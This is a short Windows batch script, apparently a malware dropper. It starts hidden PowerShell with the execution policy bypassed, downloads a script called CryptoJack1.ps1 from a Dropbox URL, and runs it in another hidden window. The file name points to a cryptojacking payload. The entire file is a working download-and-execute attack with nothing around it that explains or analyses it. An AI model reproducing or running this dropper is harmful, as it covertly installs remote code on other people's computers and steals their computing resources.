@echo off
set currentDir=%~dp0
start /wait powershell.exe -NoP -NonI -W Hidden -Command "&{(New-Object System.Net.WebClient).DownloadString('https://www.dropbox.com/s/txb5hiuv7g9xm67/CryptoJack1.ps1?dl=1') > '%~dp0CryptoJack1.ps1'; exit}" 
Powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0CryptoJack1.ps1""'}"